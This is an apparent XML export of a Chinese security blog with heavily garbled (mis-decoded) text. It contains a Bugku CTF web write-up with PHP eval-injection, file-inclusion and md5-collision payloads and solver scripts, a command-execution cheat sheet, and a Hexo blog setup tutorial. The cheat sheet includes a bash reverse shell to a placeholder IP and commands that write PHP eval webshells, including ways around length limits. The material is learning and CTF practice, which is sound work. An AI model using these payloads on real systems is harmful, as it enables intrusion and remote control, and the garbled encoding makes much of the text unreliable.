    <content type="text"><![CDATA[å…ˆæ”¾å‡ºbugkuctfç½‘å€:click me web2 è¿›å»ä¸€å¤§ç‰‡çš„æ»‘ç¨½,é€Ÿåº¦è¿˜è¶Šæ¥è¶Šå¿«f12çœ‹ä¸€ä¸‹ï¼Œå—¯ï¼Œå¾—flag è®¡ç®—å™¨è¦æ±‚è¾“å…¥ä¸¤ä¸ªä¸€ç™¾ä»¥å†…æ•°å­—ç›¸åŠ çš„ç»“æœï¼Œè¾“å…¥æ¡†é™äº†é•¿åº¦å®¡æŸ¥å…ƒç´ æ›´æ”¹maxlength,æäº¤å¾—flag webåŸºç¡€$_GETæ˜¾ç¤ºäº†ä»¥ä¸‹ä»£ç $what=$_GET['what'];echo $what;if($what=='flag')echo 'flag&#123;****&#125;'; ç”¨getä¼ å€¼what=flag webåŸºç¡€$_POST$what=$_POST['what'];echo $what;if($what=='flag')echo 'flag&#123;****&#125;'; æ‰“å¼€hackbarpostæ•°æ®what=flag çŸ›ç›¾$num=$_GET['num'];if(!is_numeric($num))&#123;echo $num;if($num==1)echo 'flag&#123;**********&#125;';&#125; è¦æ±‚num=1å´ä¸æ˜¯æ•°å­—phpç‰¹æ€§ï¼Œæäº¤1a (éšä¾¿åŠ ä¸ªå­—æ¯) web3æ— é™å¼¹çª—flagå°±åœ¨è¿™é‡Œâ€¦æŠ“åŒ…çœ‹ä¸€ä¸‹htmlå®ä½“ç¼–ç ï¼Œè§£ä¸€ä¸‹ åŸŸåè§£æhint:å¬è¯´æŠŠ flag.bugku.com è§£æåˆ°120.24.86.145 å°±èƒ½æ‹¿åˆ°flagä¹‹å‰æ˜¯è‡ªå·±å‚»xäº†â€¦./etc/hosts é‡ŒåŠ ä¸ª123.206.87.240 flag.bugku.comå°±å¥½äº† ä½ å¿…é¡»è®©ä»–åœä¸‹ç–¯ç‹‚åˆ·æ–°â€¦..æŠ“åŒ…æ‹¦æˆªå¾—flag æœ¬åœ°åŒ…å« &lt;?php include "flag.php"; $a = @$_REQUEST['hello']; eval( "var_dump($a);"); show_source(__FILE__);?&gt; æ„é€ é—­åˆç¬¦å·å°±å¥½äº†hello=); show_source(flag.php æ²¡ååº”ï¼Œå°´å°¬hello=); print(flag.php æµ‹è¯•ä¸€ä¸‹è¾“å‡ºäº†flagphpï¼Œwtfï¼Ÿè¿‡æ»¤äº†.æ¢ä¸ªæ€è·¯hello=);print_r(file("flag.php") å˜é‡1flag In the variable ! &lt;?php error_reporting(0);include "flag1.php";highlight_file(__file__);if(isset($_GET['args']))&#123; $args = $_GET['args']; if(!preg_match("/^\w+$/",$args))&#123; die("args error!"); &#125; eval("var_dump($$args);");&#125;?&gt; ä»¥ä¸ºåˆæ˜¯ç»•è¿‡ï¼Œè€—äº†å¥½äº›æ—¶é—´â€¦.åæ¥å‘ç°$$phpå…¨å±€å˜é‡GLOBALSï¼Œ$GLOBALSå¯ä»¥è°ƒç”¨ï¼Œæœæ–­?args=GLOBALSget it web5hint1:jspfuckhint2:å¤§å†™f12çœ‹åˆ°æ˜¯jsfuckï¼Œæ§åˆ¶å°é»è´´å›è½¦ å¤´ç­‰èˆ±ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Ÿï¼Ÿï¼ŸæŠ“åŒ…çœ‹çœ‹,æœ‰ç‚¹æ„æ€flagåœ¨æ¶ˆæ¯å¤´ ç½‘ç«™è¢«é»‘å—¯..ä¸€ä¸ªé»‘é¡µï¼Œç¿»äº†ç¿»ä»€ä¹ˆéƒ½æ²¡æœ‰ä¸Šç›®å½•æ‰«æå™¨(æˆ‘è¿™é‡Œç”¨dirsearch)ç”¨å¾¡å‰‘çš„äººä¼šæ¯”è¾ƒå¤šæ‰«åˆ°ä¸ªé©¬,å…ˆè®¿é—®çœ‹çœ‹ï¼Œè¦è¾“å¯†ç ï¼Œéšä¾¿è¾“ä¸€ä¸ªè¯•è¯•æç¤ºä¸æ˜¯è‡ªå·±çš„é©¬ä¸è¦ä¹±éª‘â€¦æœ‰ç‚¹æ„æ€æ‹¿burpæŒ‚ä¸ªå­—å…¸ç›´æ¥çˆ†ç ´â€¦ ç®¡ç†å‘˜ç³»ç»Ÿç™»å½•æ¡†emmmm,è¯•è¯•ä¸‡èƒ½å¯†ç è®°å½•ipï¼Œè¿˜çœŸæœ‰ç‚¹å°æ€•æ€•å‘¢~æ’ä¸ªX-Forwarded-For: 123.206.31.85ä¸æŠ¥ç¦æ­¢è®¿é—®äº†ï¼Œç„¶å?å¡äº†ä¸€ä¼šï¼Œf12çœ‹ä¸€ä¸‹æœ‰ä¸ªæ³¨é‡ŠdGVzdDEyMw== æ˜¯base64ï¼Œè§£ç test123ç›®æµ‹æ˜¯å¯†ç ï¼Œé‚£ç”¨æˆ·åå‘¢?admin?root?administrator?éƒ½ä¸æ˜¯?ä¸å¯¹ï¼Œæ¢ä¸ªæ€è·¯ï¼Œæ”¹X-Forwarded-For: 192.168.1.1å†æ”¹127.0.0.1æˆäº†ï¼Œå’‹å°±å¿˜äº†è¿™ä¸ªå‘¢â€¦.å°´å°¬ web4uslè§£ç çœ‹çœ‹ï¼Œä¹±ä¸ƒå…«ç³Ÿï¼Œç†ä¸€ä¸‹æ ¼å¼function checkSubmit()&#123; var a=document.getElementById("password"); if("undefined"!=typeof a)&#123; if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value) return!0; alert("Error"); a.focus(); return!1 &#125;&#125;document.getElementById("levelQuest").onsubmit=checkSubmit;eval(unescape(p1) + unescape('%35%34%61%61%32' + p2)); æ‰‹åŠ¨æ‹¼æ¥å†è§£ç æäº¤67d709b2b54aa2aa648cf6e87a7114f1 flagåœ¨indexé‡Œclick me.ç‚¹ä¹‹ï¼Œè·³è½¬urlæœ‰ä¸œè¥¿http://120.24.86.145:8005/post/index.php?file=show.php æ˜¯æ–‡ä»¶åŒ…å«ï¼Œç›´æ¥filteråè®®è¯»index.php?file=php://filter/read=convert.base64-encode/resource=index.php çœ‹åˆ°äº†â€™//flag:flag{edulcni_elif_lacol_si_siht}â€™ è¾“å…¥å¯†ç æŸ¥çœ‹flag120.24.86.145:8002/baopo/æ—¢ç„¶éƒ½å†™å¾—è¿™ä¹ˆæ˜æ˜ç™½ç™½çš„çˆ†ç ´äº†é‚£å°±çˆ†ç ´å§äº”ä½æ•°æ•°å­—ï¼Œè¦ä¸äº†å¤šä¹…ç¬¬ä¸€æ¬¡æ²¡çˆ†å‡ºæ¥ï¼Ÿï¼Ÿï¼Ÿæ˜¯è‡ªå·±å‚»é€¼äº†ï¼Œè°ƒäº†5é€’å¢â€¦å†çˆ†ä¸€æ¬¡ ç‚¹å‡»ä¸€ç™¾ä¸‡æ¬¡hints:javascriptf12çœ‹ä¸€ä¸‹var clicks=0$(function() &#123; $("#cookie") .mousedown(function() &#123; $(this).width('350px').height('350px'); &#125;) .mouseup(function() &#123; $(this).width('375px').height('375px'); clicks++; $("#clickcount").text(clicks); if(clicks &gt;= 1000000)&#123; var form = $('&lt;form action="" method="post"&gt;' + '&lt;input type="text" name="clicks" value="' + clicks + '" hidden/&gt;' + '&lt;/form&gt;'); $('body').append(form); form.submit(); &#125; &#125;);&#125;); ä»£ç éƒ½åœ¨è¿™é‡Œæ€ä¹ˆæ”¹éƒ½è¡Œäº†å¤§äº1000000å°±postä¸ªè¡¨å•ã€‚ã€‚æˆ‘å¹²è„†æ„é€ ä¸€ä¸ªpostè¡¨å•æäº¤å°±å¥½äº† å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯å¤‡ä»½ï¼Œå…¸å‹çš„æºç æ³„éœ²ç›´æ¥è®¿é—®index.php.bakä¸‹è½½ä¸‹æ¥çœ‹ä¸€ä¸‹&lt;?php/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22*/include_once "flag.php";ini_set("display_errors", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag."å–å¾—flag";&#125; md5ç›¸ç­‰ï¼Œå€¼ä¸ç­‰ã€‚ã€‚phpéšå¼è½¬æ¢çš„ç¼ºé™·ï¼ŒPHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0æ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0240610708å’ŒQNKCDZOä½†è¿˜æ˜¯æœ‰ä¸€ä¸ªå‘str_replaceè¿‡æ»¤äº†keyhttp://120.24.86.145:8002/web16/index.php?kekeyy1=240610708&amp;&amp;kekeyy2=QNKCDZO æˆäº† æˆç»©å•å—¯ï¼Œsqlæ³¨å…¥1' or 1=1# ä¸æŠ¥é”™ã€‚unionæŸ¥è¯¢å’Œæ—¶é—´ç›²æ³¨ä¸¢åˆ°sqlmapç›´æ¥è·‘ ç§‹åå±±è€å¸æœºå†™ä¸ªå°jioæœ¬å§â€¦.# !/usr/bin/env python# coding:utf-8import requestsfrom lxml import htmlimport reurl = 'http://123.206.87.240:8002/qiumingshan/'requests = requests.Session()rs = requests.get(url)rs = html.fromstring(rs.content)rs = str(rs.xpath('//div/text()'))rs = eval(rs[2:-5])data=&#123; 'value': rs&#125;rs = requests.post(url,data=data)print rs.content å¦‚æœå€¼åä¸å¯¹ä¼šæç¤ºç”¨value:Give me value post aboutâ€¦. åŸæ¥ä½ ä¹Ÿæ˜¯è€å¸æœº Bugku{YOU_DID_IT_BY_SECOND}[Finished in 0.9s] é€Ÿåº¦è¦å¿«hint:æ ¼å¼KEY{xxxxxxxxxxxxxx}æ•°æ®åŒ…é‡Œæœ‰ä¸œè¥¿çœ‹ç€åƒbase64ï¼Œè§£ç æŒ‰ç…§æç¤ºPOSTä¸€ä¸ªå‚æ•°margin=WQpzogT0RJek9EVXc=æç¤ºè®©å¿«ç‚¹ï¼Œè„šæœ¬ä¾å€™ï¼Œä¸è¡ŒåŠ ä¸ªè§£ç # !/usr/bin/env python#-*-coding:utf-8-*-import requestsimport base64url = "http://123.206.87.240:8002/web6/"session = requests.Session()rs = session.get(url).headers['flag']flag = base64.b64decode(base64.b64decode(rs).split(':')[1])payload = &#123;'margin':flag&#125;rs = session.post(url,payload)print rs.content cookiesæ¬ºéª—åˆšå¼€å§‹è¿˜ä»¥ä¸ºçœŸæcookieå®é™…ä¸Šæ˜¯æ–‡ä»¶åŒ…å«æ³„æ¼ä¸»é¡µæºç è¯·æ±‚urlå‚æ•°ç»è¿‡base64ç¼–ç ï¼Œè§£ç å‘ç°æ˜¯keys.txt,æŠŠindex.phpç¼–ç ä¸€ä¸‹/web11/index.php?line=&amp;filename=aW5kZXgucGhw åªæœ‰ä¸€è¡Œï¼Œæ³¨æ„åˆ°lineå‚æ•°# !/usr/bin/env python#-*-coding:utf-8-*-import requestsimport base64for i in xrange(0,20): url = "http://123.206.87.240:8002/web11/index.php?line="+str(i)+"&amp;filename=aW5kZXgucGhw" rs = requests.get(url) print rs.text å¾ªç¯è¯»ä¸€ä¸‹æºç &lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array( '0' =&gt;'keys.txt', '1' =&gt;'index.php',);if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123; $file_list[2]='keys.php';&#125;if(in_array($file, $file_list))&#123; $fa = file($file); echo $fa[$line];&#125;?&gt; è¿™ä¸‹åå‰¯å…¶å®cookieæ¬ºéª—äº†]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[å‘½ä»¤æ‰§è¡Œé‚£äº›äº‹]]></title>
    <url>%2F2018%2F09%2F09%2Fsafe-command-exec%2F</url>
    <content type="text"><![CDATA[å‘½ä»¤æ‰§è¡Œå®šä¹‰ä½¿ç”¨æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°æ—¶ï¼Œæ²¡æœ‰è¿›è¡Œè¿‡æ»¤ ç»§æ‰¿webæœåŠ¡å™¨æƒé™ å‘½ä»¤æ‰§è¡Œç›¸å…³å‡½æ•° system(è¿”å›æœ€åä¸€è¡Œ) exec passthru(è¿”å›æœ€åä¸€è¡Œ) shell_exec ä½œç”¨ä¸ åå¼•å·ä¸€è‡´ popen(è¿”å›æ–‡ä»¶æŒ‡é’ˆ) proc_open(è¿”å›æ–‡ä»¶æŒ‡é’ˆ) pcntl_exec å¤šè¿›ç¨‹å¤„ç†æ‰©å±•,éœ€é¢å¤–å®‰è£… (string $path, array $args, array $envs) &lt;?php $w = 'whoami'; system($w); passthru($w); echo '&lt;br/&gt;'.'exec:'.exec($w).'&lt;br/&gt;'; echo 'shell_exec:'.shell_exec($w).'&lt;br/&gt;'; echo `$w`; echo popen('whoami','r'); //(cmd,mode[r,w])//è¯»å’Œå†™ proc_open('proc_open:'.$w).'&lt;br/&gt;'; pcntl_exec('pcntl_exec:'.$w).'&lt;br/&gt;';?&gt; å‘½ä»¤æ‰§è¡Œé˜²å¾¡å‡½æ•° escapeshellarg() //è½¬ä¹‰å‚æ•° å°†å¼•å·æ›¿æ¢ä¸ºç©ºæ ¼ escapeshellcmd() //è¿‡æ»¤æ•´æ¡å‘½ä»¤(winä¸‹åŠ ^ linuxåŠ \) echo 'ls '.escapeshellarg('a"'); è¿‡æ»¤å­—ç¬¦æœ‰&amp; ; ` | * ? ~ &lt; &gt; ^ ( ) [ ] &#123; &#125; $ \ \x0A \xFF %' " åœ¨ä¸æˆå¯¹æƒ…å†µä¸‹ä¹Ÿè¿‡æ»¤ ä»£ç æ‰§è¡Œç›¸å…³å‡½æ•° eval assert preg_replace (php&lt;=5.5) call_user_func call_user_func_array array_map å‰ä¸¤ä¸ªå°±ä¸è¯´äº†ï¼Œä¸€å¥è¯å¸¸è§ - preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])//æœç´¢subjectä¸­åŒ¹é…patternçš„éƒ¨åˆ†ï¼Œ ä»¥replacementè¿›è¡Œæ›¿æ¢ã€‚//å½“ç¬¬ä¸€ä¸ªå‚æ•°çš„æ­£åˆ™è¡¨è¾¾å¼æœ‰eä¿®æ­£ç¬¦çš„æ—¶å€™ï¼Œç¬¬äºŒä¸ªå‚æ•°çš„å­—ç¬¦ä¸²å½“åšPHPä»£ç æ‰§è¡Œ &lt;?php//?cmd=phpinfo()preg_replace(â€œ/test/eâ€,$_GET["cmd"],â€jutsttestâ€);?&gt; //?value=[phpinfo()]preg_replace('/\[(.*)\]/e', 'strtolower("\\1")', $_GET['value']);//strtolower("\\1")å®é™…å°±æ˜¯\1 è€Œ\1åœ¨æ­£åˆ™ä¸­æœ‰è‡ªå·±çš„å«ä¹‰ åå‘å¼•ç”¨ å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼ ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å· å°†å¯¼è‡´ç›¸å…³ åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒº ä¸­ï¼Œæ‰€æ•è·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»å·¦åˆ°å³å‡ºç°çš„é¡ºåºå­˜å‚¨ã€‚ç¼“å†²åŒºç¼–å·ä» 1 å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨ 99 ä¸ªæ•è·çš„å­è¡¨è¾¾å¼ã€‚æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨ â€˜\nâ€™ è®¿é—®ï¼Œå…¶ä¸­ n ä¸ºä¸€ä¸ªæ ‡è¯†ç‰¹å®šç¼“å†²åŒºçš„ä¸€ä½æˆ–ä¸¤ä½åè¿›åˆ¶æ•°ã€‚ æ·±å…¥ç ”ç©¶preg_replace æ‰€ä»¥è¿™é‡Œçš„ \1 å®é™…ä¸ŠæŒ‡å®šçš„æ˜¯ç¬¬ä¸€ä¸ªå­åŒ¹é…é¡¹,å³valueä¸­ç¬¬ä¸€ä¸ªå­åŒ¹é…é¡¹,è¾¾åˆ°ä»£ç æ‰§è¡Œç›®çš„ - call_user_func()- call_user_func_array()- array_map() //è°ƒç”¨å…¶ä»–å‡½æ•°åŠŸèƒ½//ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºå›è°ƒå‡½æ•°,åé¢çš„å‚æ•°ä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°$b = 'phpinfo()';call_user_func($_GET['a'], $b);//å½“?a=evalæ—¶å°±è°ƒç”¨äº†evalå‡½æ•°è€Œphpinfo()ä½œä¸ºå‚æ•° å‘½ä»¤æ‰§è¡Œå¸¸ç”¨ç¬¦ Windowsæ”¯æŒçš„ç®¡é“ç¬¦| ç›´æ¥æ‰§è¡Œåè¾¹çš„|| å¦‚æœå‰é¢æ‰§è¡Œå‡ºé”™ï¼Œæ‰§è¡Œåè¾¹ï¼Œåªèƒ½ä¸ºå‡&amp; å¦‚æœå‰é¢è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåè¾¹ï¼Œå‰è¾¹å¯çœŸå¯å‡&amp;&amp; å‰è¾¹å‡å‡ºé”™ï¼Œå‰è¾¹åªèƒ½ä¸ºçœŸ Linuxæ”¯æŒçš„ç®¡é“ç¬¦; æ‰§è¡Œå®Œå‰è¾¹æ‰§è¡Œåè¾¹| å…ˆæ˜¯åè¾¹è¯­å¥æ‰§è¡Œç»“æœ|| å½“å‰è¯­å¥æ‰§è¡Œå‡ºé”™ï¼Œæ‰§è¡Œåè¾¹&amp; å¦‚æœå‰è¾¹ä¸ºå‡ç›´æ¥æ‰§è¡Œåè¾¹ï¼Œå‰é¢å¯çœŸå¯å‡&amp;&amp; å¦‚æœå‰è¾¹ä¸ºå‡å‡ºé”™ï¼Œåªèƒ½ä¸ºçœŸ å‘½ä»¤æ‰§è¡Œçš„å¥‡æ·«æŠ€å·§ ç»•è¿‡é»‘åå•a1;b=s;$a$b æ— å›æ˜¾ç»•è¿‡æ–¹æ³• å¼¹shellï¼Œncç›‘å¬åˆ¤æ–­ nc -l -p 8080 -vvv|bash -i &gt;&amp; /dev/tcp/IP/8080 0&gt;&amp;1 åˆ©ç”¨DNSéš§é“å‚è€ƒæ–‡ç«  åˆ©ç”¨echoå†™é©¬echo '&lt;?php @eval($_GET[1]);?&gt;'&gt;1.php å¦‚æœé•¿åº¦æœ‰é™åˆ¶å¯ä»¥è¿½åŠ ç»•è¿‡echo '&lt;?php'&gt;1.phpecho '@eval('&gt;&gt;1.phpecho '$_GET['&gt;&gt;1.phpecho '1]);'&gt;&gt;1.phpecho '?&gt;'&gt;&gt;1.php æˆ–è€…ç”¨åæ–œæ \æ‹¼æ¥echo "&lt;?php @eval(\\$_POST[1]); ?&gt;"\&gt;&gt; 1.php ä½¿ç”¨å•å¼•å·çš„æ—¶å€™åæ–œæ ä¼šå†™è¿›è¯­å¥çš„é‡Œé¢ï¼Œæ‰€ä»¥ä½¿ç”¨åŒå¼•å·ï¼Œç„¶ååœ¨$çš„å‰é¢åŠ ä¸€ä¸ªåæ–œæ è½¬ä¹‰ åˆ©ç”¨lså†™é©¬é€šè¿‡ls -tæŒ‰æ—¶é—´æ’åˆ—å†™é©¬echo &gt; '?&gt;'echo &gt; '($_POST[1]);'echo &gt; '@eval'echo &gt; '&lt;?php'ls -t &gt; 1.php]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
        <tag>æ¸—é€æµ‹è¯•</tag>
        <tag>Webå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HEXOé…ç½®æ•™ç¨‹(Next.Mistä¸»é¢˜)]]></title>
    <url>%2F2018%2F07%2F24%2Fhexo-config%2F</url>
    <content type="text"><![CDATA[Hexoç®€ä»‹ hexo ä¸€ä¸ªå¿«é€Ÿç®€æ´é«˜æ•ˆçš„åšå®¢æ¡†æ¶ï¼Œå…¶åŸºäºNode.jsçš„é™æ€blogç¨‹åº ä½œè€…æ˜¯å°æ¹¾çš„tommy351 ä»€ä¹ˆï¼Ÿä½ é—®æˆ‘ä¸ºä»€ä¹ˆä¸ç”¨Wordpressï¼Ÿä½ çŒœã€‚ é‡‡ç”¨ç¬¬ä¸€ç§çš„å¼Šç«¯å°±æ˜¯â€Github Pagesâ€ç¦äº†ç™¾åº¦çˆ¬è™« å‘µï¼æ‰ä¸å­˜åœ¨å‘¢ã€‚æˆ‘ç­‰å°èŒæ–°æ²¡æœ‰å½±å“çš„ã€‚ å¿…è¦å‰æå®‰è£…hexoå‰å¿…é¡»çš„ç¨‹åº Node.js Git Hexoå®˜æ–¹æ–‡æ¡£Nodejså®˜æ–¹æ–‡æ¡£Nextå®˜æ–¹æ–‡æ¡£ å®‰è£…Nodejs#å®‰è£…nodejs$ sudo git clone https://github.com/nodejs/node.gitCloning into 'node'...#ä¿®æ”¹ç›®å½•æƒé™ï¼š$ sudo chmod -R 755 node#ä½¿ç”¨ ./configure åˆ›å»ºç¼–è¯‘æ–‡ä»¶ï¼Œå¹¶æŒ‰ç…§ï¼š$ cd node$ sudo ./configure$ sudo make$ sudo make install#æŸ¥çœ‹ node ç‰ˆæœ¬ï¼š$ node --versionv11.1.0 å®‰è£…Gitå¦ä¸€ç‰‡æ–‡ç«  å®‰è£…hexo$ npm install hexo-cli -g åˆ›å»ºç½‘ç«™æ–‡ä»¶$ mkdir blog# åˆå§‹åŒ–$ hexo init blog &amp;&amp; cd blog å®‰è£…hexoæ’ä»¶$ npm install hexo-deployer-git --save$ npm install hexo-asset-image --save# Rss$ npm install hexo-generator-feed --save# sitemap$ npm install hexo-generator-sitemap --save$ npm install hexo-generator-baidu-sitemap --save$ npm install hexo-renderer-pug --save$ npm install hexo-renderer-sass --save#æœç´¢æ’ä»¶npm install hexo-generator-searchdb --save# ç”Ÿæˆ SSH å…¬é’¥å’Œå¯†é’¥ é»˜è®¤ç”Ÿæˆåœ¨æ ¹ç›®å½•çš„.sshæ–‡ä»¶å¤¹ä¸‹ ~/.ssh$ ssh-keygen -t rsa # æµ‹è¯• (å‚æ•° -v è¿›å…¥debugæ¨¡å¼)$ ssh -t git@github.com $ hexo clean &amp;&amp; hexo g &amp;&amp; hexo s$ hexo d ç½‘ç«™é…ç½®æ–‡ä»¶ é…ç½®æ–‡ä»¶å­˜å‚¨ä½ç½®:blog/_config.yml# Hexo Configuration Hexoé…ç½®æ–‡ä»¶## Docs: https://hexo.io/docs/configuration.html## Source: https://github.com/hexojs/hexo/# ç½‘ç«™ä¿¡æ¯# æ ‡é¢˜title: Sherdh# å‰¯æ ‡é¢˜subtitle: ä½ çœ‹ï¼Œé‚£ä¸ªäººå¥½å¥‡æ€ªå“¦ï¼æ˜¯å•Šï¼Œå¥½åƒä¸€æ¡ç‹—ï¼# åšå®¢æè¿°description: # ä½œè€…æ˜µç§°author: Sherdh# ç½‘ç«™è¯­è¨€ï¼Œé»˜è®¤è‹±è¯­ï¼Œè®¾ç½®ç®€ä½“æ±‰è¯­language: zh-CN# æ—¶åŒºï¼Œé»˜è®¤ç”µè„‘æ—¶åŒºtimezone: Asia/Shanghai# ç½‘å€è®¾ç½®# å¦‚æœç½‘ç«™æ˜¯æ”¾åœ¨å­ç›®å½•ä¸­ï¼Œå°†urlè®¾ç½®æˆ'http://yoursite.com/child'ï¼Œå°†rootè®¾ç½®æˆ'/child/'# ç½‘å€url: https://sherdh.github.io# ç½‘ç«™æ ¹ç›®å½•ã€‚å¦‚æœç½‘ç«™æ˜¯æ”¾åœ¨å­ç›®å½•ä¸­ï¼Œå°†rootè®¾ç½®æˆ'å­ç›®å½•å'root: /# æ–‡ç« é“¾æ¥åœ°å€æ ¼å¼ ã€‚å³æ–‡ç« å­˜æ”¾çš„ç›®å½•ã€‚permalink: :year/:month/:day/:title/permalink_defaults:# ç›®å½•è®¾ç½®# èµ„æºæ–‡ä»¶å¤¹ï¼Œæ”¾åœ¨é‡Œé¢çš„æ–‡ä»¶ä¼šä¸Šä¼ åˆ°githubä¸­source_dir: source# å…¬å…±æ–‡ä»¶å¤¹ï¼Œå­˜æ”¾ç”Ÿæˆçš„é™æ€æ–‡ä»¶public_dir: public# æ ‡ç­¾æ–‡ä»¶å¤¹ï¼Œé»˜è®¤æ˜¯tagsã€‚å®é™…å­˜æ”¾åœ¨source/tagsä¸­ã€‚tag_dir: tagsrss_dir: rss# æ¡£æ¡ˆæ–‡ä»¶å¤¹ï¼Œé»˜è®¤æ˜¯archivesã€‚archive_dir: archives# åˆ†ç±»æ–‡ä»¶å¤¹ï¼Œé»˜è®¤æ˜¯categoriesã€‚å®é™…å­˜æ”¾åœ¨source/categoriesä¸­ã€‚category_dir: categories# ä»£ç æ–‡ä»¶å¤¹ï¼Œé»˜è®¤æ˜¯downloads/codecode_dir: downloads/code# å›½é™…åŒ–æ–‡ä»¶å¤¹ï¼Œé»˜è®¤è·Ÿlanguageç›¸åŒi18n_dir: :lang# ä¸éœ€è¦æ¸²æŸ“çš„æ–‡ä»¶å¤¹æˆ–æ–‡ä»¶å¤¹,æ”¾åœ¨[]ä¸­# è¿™ä¸¤ä¸ªæ–‡ä»¶æ˜¯ç™¾åº¦å’Œgoogleçš„ç«™é•¿éªŒè¯æ–‡ä»¶ï¼Œä¸èƒ½æ¸²æŸ“ï¼Œå¦åˆ™ä¼šæ”¹å˜å†…å®¹ï¼Œä¸èƒ½éªŒè¯è¿‡skip_render: [baidu_verify_R9MZjdMkXT.html, google0f8fac7da2b48ef8.html, README.md, æ¨¡æ¿.md]# å†™ä½œé€‰é¡¹# æ–°å»ºåšæ–‡ï¼ˆå¸–å­ï¼‰çš„é»˜è®¤åç§°# File name of new postsnew_post_name: :title.md # é»˜è®¤å¸ƒå±€æ¨¡æ¿æ˜¯postï¼Œè€Œä¸æ˜¯draftå’Œpagedefault_layout: post# æ˜¯å¦å°†æ ‡é¢˜è½¬æ¢æˆæ ‡é¢˜å½¢å¼ï¼ˆé¦–å­—æ¯å¤§å†™ï¼‰titlecase: false # Transform title into titlecase# åœ¨æ–°æ ‡ç­¾é¡µé¢ä¸­æ‰“å¼€ç½‘é¡µexternal_link: true # Open external links in new tabfilename_case: 0# æ˜¯å¦æ¸²æŸ“è‰ç¨¿render_drafts: false# å¯åŠ¨ Asset æ–‡ä»¶å¤¹post_asset_folder: false# æŠŠé“¾æ¥æ”¹ä¸ºä¸æ ¹ç›®å½•çš„ç›¸å¯¹ä½å€relative_link: false# æ˜¾ç¤ºæœªæ¥çš„æ–‡ç« future: true# ä»£ç å—çš„è®¾ç½®highlight: enable: true # ä½¿ç”¨ä»£ç é«˜äº® line_number: true # æ˜¾ç¤ºè¡Œå· auto_detect: true # è‡ªåŠ¨æ£€æµ‹è¯­è¨€ tab_replace:# åˆ†ç±»å’Œæ ‡ç­¾# é»˜è®¤åˆ†ç±»default_category: uncategorized# åˆ†ç±»åˆ«åcategory_map:# æ ‡ç­¾åˆ«åtag_map:# æ—¥æœŸå’Œæ—¶é—´æ ¼å¼# Hexo ä½¿ç”¨ Moment.js æ¥è§£æå’Œæ˜¾ç¤ºæ—¶é—´ã€‚## You can customize the date format as defined in## http://momentjs.com/docs/#/displaying/format/date_format: YYYY-MM-DDtime_format: HH:mm:ss# åˆ†é¡µé…ç½®# ---------------ä¸‹é¢é€‰é¡¹éœ€è¦å¯¹åº”æ’ä»¶çš„æ”¯æŒ---------------# npm install hexo-generator-index --save# npm install hexo-generator-archive --save# npm install hexo-generator-category --save# npm install hexo-generator-tag --save## Set per_page to 0 to disable pagination# æ¯é¡µæ˜¾ç¤ºçš„æ–‡ç« é‡ # per_page: 20# é¦–é¡µçš„åˆ†é¡µè®¾ç½®index_generator: per_page: 5# å½’æ¡£é¡µçš„åˆ†é¡µè®¾ç½®archive_generator: per_page: 30 yearly: true monthly: true# æ ‡ç­¾é¡µçš„åˆ†é¡µè®¾ç½®tag_generator: per_page: 20# åˆ†é¡µè·¯å¾„ï¼Œåœ¨publicä¸­å¯ä»¥çœ‹åˆ°# pagination_dir: page# Extensions æ‹“å±•æ’ä»¶é…ç½®## Plugins: https://hexo.io/plugins/plugins: baidusitemap: path: baidusitemap.xml# é…ç½®RSSfeed: # feed ç±»å‹ (atom/rss2) type: atom # rss è·¯å¾„ path: atom.xml # åœ¨ rss ä¸­æœ€å¤šç”Ÿæˆçš„æ–‡ç« æ•°(0æ˜¾ç¤ºæ‰€æœ‰) limit: 0# è‡ªå®šä¹‰ç«™ç‚¹å†…å®¹æœç´¢# éœ€è¦å…ˆå®‰è£…æ’ä»¶ï¼š# npm install hexo-generator-search --savesearch: path: search.xml # å¦‚åªæƒ³ç´¢å¼•æ–‡ç« ï¼Œå¯è®¾ç½®ä¸ºpost field: all # 